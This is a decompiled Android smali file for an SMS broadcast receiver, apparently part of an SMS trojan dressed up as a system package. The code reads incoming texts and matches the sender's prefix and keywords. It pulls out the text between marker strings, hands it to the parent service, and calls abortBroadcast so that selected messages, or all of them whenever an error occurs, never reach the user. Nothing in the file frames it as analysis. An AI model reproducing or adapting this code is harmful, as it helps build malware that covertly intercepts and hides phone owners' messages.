.class public Lcom/android/main/MainService$SMSReceiver;
.super Landroid/content/BroadcastReceiver;
.source "MainService.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/android/main/MainService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "SMSReceiver"
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/main/MainService;


# direct methods
.method public constructor <init>(Lcom/android/main/MainService;)V
    .locals 0

    .prologue
    .line 735
    iput-object p1, p0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 21
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 738
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v3

    .line 740
    .local v3, "actionName":Ljava/lang/String;
    const-string v18, "ANDROID_INFO"

    .line 741
    new-instance v19, Ljava/lang/StringBuilder;

    const-string v20, "MainService.SMSReceiver.onReceiver() action="

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 742
    move-object/from16 v0, v19

    move-object v1, v3

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 741
    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    .line 740
    invoke-static/range {v18 .. v19}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 743
    invoke-virtual/range {p0 .. p0}, Lcom/android/main/MainService$SMSReceiver;->getResultCode()I

    move-result v13

    .line 744
    .local v13, "resultCode":I
    const-string v18, "com.test.sms.send"

    move-object v0, v3

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v18

    if-eqz v18, :cond_1

    .line 820
    .end local p1    # "context":Landroid/content/Context;
    :cond_0
    :goto_0
    return-void

    .line 748
    .restart local p1    # "context":Landroid/content/Context;
    :cond_1
    const-string v18, "com.test.sms.delivery"

    move-object v0, v3

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v18

    if-nez v18, :cond_0

    .line 752
    const-string v18, "android.provider.Telephony.SMS_RECEIVED"

    move-object v0, v3

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v18

    if-eqz v18, :cond_0

    .line 754
    :try_start_0
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v4

    .line 755
    .local v4, "bundle":Landroid/os/Bundle;
    if-eqz v4, :cond_0

    .line 756
    const-string v18, "pdus"

    move-object v0, v4

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v12

    check-cast v12, [Ljava/lang/Object;

    .line 758
    .local v12, "myOBJpdus":[Ljava/lang/Object;
    const-string v18, "ANDROID_INFO"

    new-instance v19, Ljava/lang/StringBuilder;

    const-string v20, "pdus.length="

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 759
    move-object v0, v12

    array-length v0, v0

    move/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    .line 758
    invoke-static/range {v18 .. v19}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 760
    move-object v0, v12

    array-length v0, v0

    move/from16 v18, v0

    move/from16 v0, v18

    new-array v0, v0, [Landroid/telephony/gsm/SmsMessage;

    move-object v11, v0

    .line 761
    .local v11, "messages":[Landroid/telephony/gsm/SmsMessage;
    const-string v15, ""

    .line 762
    .local v15, "showContent":Ljava/lang/String;
    const/4 v7, 0x0

    .end local p1    # "context":Landroid/content/Context;
    .local v7, "i":I
    :goto_1
    move-object v0, v12

    array-length v0, v0

    move/from16 v18, v0

    move v0, v7

    move/from16 v1, v18

    if-lt v0, v1, :cond_4

    .line 776
    const/16 v18, 0x0

    aget-object v10, v11, v18

    .line 778
    .local v10, "message":Landroid/telephony/gsm/SmsMessage;
    invoke-virtual {v10}, Landroid/telephony/gsm/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v14

    .line 780
    .local v14, "showAddress":Ljava/lang/String;
    if-eqz v14, :cond_2

    const-string v18, ""

    move-object/from16 v0, v18

    move-object v1, v14

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v18

    if-nez v18, :cond_2

    .line 781
    if-eqz v15, :cond_2

    .line 782
    const-string v18, ""

    move-object/from16 v0, v18

    move-object v1, v15

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v18

    if-nez v18, :cond_2

    .line 783
    const-string v18, "1"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    move-object/from16 v19, v0

    invoke-static/range {v19 .. v19}, Lcom/android/main/MainService;->access$1(Lcom/android/main/MainService;)Ljava/lang/String;

    move-result-object v19

    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v18

    if-eqz v18, :cond_2

    .line 784
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    move-object/from16 v18, v0

    const/16 v19, -0x2d

    move-object/from16 v0, v18

    move/from16 v1, v19

    move-object v2, v15

    invoke-static {v0, v1, v2}, Lcom/android/main/MainService;->access$2(Lcom/android/main/MainService;ILjava/lang/String;)I

    .line 785
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Lcom/android/main/MainService;->access$3(Lcom/android/main/MainService;)Ljava/lang/String;

    move-result-object v18

    move-object v0, v14

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v18

    if-eqz v18, :cond_2

    .line 786
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Lcom/android/main/MainService;->access$4(Lcom/android/main/MainService;)Ljava/lang/String;

    move-result-object v18

    move-object v0, v15

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v18

    const/16 v19, -0x1

    move/from16 v0, v18

    move/from16 v1, v19

    if-le v0, v1, :cond_2

    .line 787
    const-string v18, "1"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    move-object/from16 v19, v0

    invoke-static/range {v19 .. v19}, Lcom/android/main/MainService;->access$1(Lcom/android/main/MainService;)Ljava/lang/String;

    move-result-object v19

    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v18

    if-eqz v18, :cond_2

    .line 790
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Lcom/android/main/MainService;->access$5(Lcom/android/main/MainService;)Ljava/lang/String;

    move-result-object v18

    move-object v0, v15

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v17

    .line 792
    .local v17, "start":I
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Lcom/android/main/MainService;->access$6(Lcom/android/main/MainService;)Ljava/lang/String;

    move-result-object v18

    move-object v0, v15

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v6

    .line 793
    .local v6, "end":I
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Lcom/android/main/MainService;->access$5(Lcom/android/main/MainService;)Ljava/lang/String;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/String;->length()I

    move-result v8

    .line 794
    .local v8, "len":I
    add-int v18, v17, v8

    move/from16 v0, v18

    move v1, v6

    if-ge v0, v1, :cond_2

    .line 796
    add-int v18, v17, v8

    .line 795
    move-object v0, v15

    move/from16 v1, v18

    move v2, v6

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v16

    .line 797
    .local v16, "smsBody":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    move-object/from16 v18, v0

    move-object/from16 v0, v18

    move-object v1, v14

    move-object/from16 v2, v16

    invoke-static {v0, v1, v2}, Lcom/android/main/MainService;->access$7(Lcom/android/main/MainService;Ljava/lang/String;Ljava/lang/String;)V

    .line 803
    .end local v6    # "end":I
    .end local v8    # "len":I
    .end local v16    # "smsBody":Ljava/lang/String;
    .end local v17    # "start":I
    :cond_2
    if-eqz v14, :cond_0

    .line 804
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Lcom/android/main/MainService;->access$8(Lcom/android/main/MainService;)Ljava/lang/String;

    move-result-object v18

    move-object v0, v14

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v18

    if-nez v18, :cond_3

    const-string v18, ""

    .line 805
    move-object/from16 v0, v18

    move-object v1, v15

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v18

    if-nez v18, :cond_0

    .line 806
    const-string v18, ""

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    move-object/from16 v19, v0

    invoke-static/range {v19 .. v19}, Lcom/android/main/MainService;->access$9(Lcom/android/main/MainService;)Ljava/lang/String;

    move-result-object v19

    invoke-virtual/range {v18 .. v19}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v18

    if-nez v18, :cond_0

    .line 807
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Lcom/android/main/MainService;->access$9(Lcom/android/main/MainService;)Ljava/lang/String;

    move-result-object v18

    move-object v0, v15

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v18

    const/16 v19, -0x1

    move/from16 v0, v18

    move/from16 v1, v19

    if-le v0, v1, :cond_0

    .line 808
    :cond_3
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Lcom/android/main/MainService;->access$10(Lcom/android/main/MainService;)Ljava/lang/String;

    move-result-object v18

    move-object v0, v14

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v18

    if-nez v18, :cond_0

    .line 810
    invoke-virtual/range {p0 .. p0}, Lcom/android/main/MainService$SMSReceiver;->abortBroadcast()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    .line 813
    .end local v4    # "bundle":Landroid/os/Bundle;
    .end local v7    # "i":I
    .end local v10    # "message":Landroid/telephony/gsm/SmsMessage;
    .end local v11    # "messages":[Landroid/telephony/gsm/SmsMessage;
    .end local v12    # "myOBJpdus":[Ljava/lang/Object;
    .end local v14    # "showAddress":Ljava/lang/String;
    .end local v15    # "showContent":Ljava/lang/String;
    :catch_0
    move-exception v18

    move-object/from16 v5, v18

    .line 815
    .local v5, "e":Ljava/lang/Exception;
    invoke-virtual/range {p0 .. p0}, Lcom/android/main/MainService$SMSReceiver;->abortBroadcast()V

    .line 816
    invoke-virtual {v5}, Ljava/lang/Exception;->printStackTrace()V

    .line 817
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService$SMSReceiver;->this$0:Lcom/android/main/MainService;

    move-object/from16 v18, v0

    const/16 v19, 0x1f6

    const/16 v20, 0x0

    invoke-static/range {v18 .. v20}, Lcom/android/main/MainService;->access$11(Lcom/android/main/MainService;II)I

    goto/16 :goto_0

    .line 764
    .end local v5    # "e":Ljava/lang/Exception;
    .restart local v4    # "bundle":Landroid/os/Bundle;
    .restart local v7    # "i":I
    .restart local v11    # "messages":[Landroid/telephony/gsm/SmsMessage;
    .restart local v12    # "myOBJpdus":[Ljava/lang/Object;
    .restart local v15    # "showContent":Ljava/lang/String;
    :cond_4
    :try_start_1
    aget-object p1, v12, v7

    check-cast p1, [B

    invoke-static/range {p1 .. p1}, Landroid/telephony/gsm/SmsMessage;->createFromPdu([B)Landroid/telephony/gsm/SmsMessage;

    move-result-object v18

    .line 763
    aput-object v18, v11, v7

    .line 766
    aget-object v18, v11, v7

    if-eqz v18, :cond_5

    .line 767
    const-string v9, ""
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 769
    .local v9, "line":Ljava/lang/String;
    :try_start_2
    aget-object v18, v11, v7

    invoke-virtual/range {v18 .. v18}, Landroid/telephony/gsm/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    move-result-object v9

    .line 773
    :goto_2
    :try_start_3
    new-instance v18, Ljava/lang/StringBuilder;

    invoke-static {v15}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v19

    invoke-direct/range {v18 .. v19}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v18

    move-object v1, v9

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v15

    .line 762
    .end local v9    # "line":Ljava/lang/String;
    :cond_5
    add-int/lit8 v7, v7, 0x1

    goto/16 :goto_1

    .line 770
    .restart local v9    # "line":Ljava/lang/String;
    :catch_1
    move-exception v18

    move-object/from16 v5, v18

    .line 771
    .restart local v5    # "e":Ljava/lang/Exception;
    invoke-virtual {v5}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_2
.end method
